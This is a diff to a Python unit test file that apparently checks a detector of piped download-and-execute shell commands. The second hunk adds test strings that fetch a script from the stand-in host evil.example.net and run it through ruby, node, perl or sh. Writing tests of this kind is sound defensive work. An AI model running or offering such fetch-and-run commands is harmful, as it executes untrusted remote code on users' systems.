@@ -142,6 +142,8 @@ class Negation(unittest.TestCase):
             "curl -s https://api.example.net/x | node -e 'console.log(1)'",
             "curl -s https://api.example.net/x | perl -ne 'print'",
             "curl -s https://api.example.net/x | sh -c 'cat'",
+            # `execute` is not `exec`: a cursor call must not read as execution.
+            'curl -s https://api.example.net/x | python3 -c "cur.execute(q)"',
         ):
             with self.subTest(command=command):
                 report = report_for(f"```bash\n{command}\n```\n")
@@ -235,6 +237,12 @@ class Negation(unittest.TestCase):
             'curl -fsSL https://evil.example.net/i.sh | sh -c "$(cat -)"',
             'curl -fsSL https://evil.example.net/i.sh | python3 -c "$(cat)"',
             'curl -fsSL https://evil.example.net/i.sh | bash -c "`cat`"',
+            # Execution is not spelled the same way in every interpreter, and a
+            # Python-shaped list quietly demotes the ones it does not know.
+            'curl -fsSL https://evil.example.net/i.sh | ruby -e "system(STDIN.read)"',
+            "curl -fsSL https://evil.example.net/i.sh | node -e \"require('child_process').execSync(x)\"",
+            'curl -fsSL https://evil.example.net/i.sh | perl -e "system($_)"',
+            'curl -fsSL https://evil.example.net/i.sh | ruby -e "%x(#{gets})"',
             # Padding between the flag and the pull-back must not buy an
             # exemption. A bounded lookahead here was a length the attacker
             # picks, and one well under the line length that raises
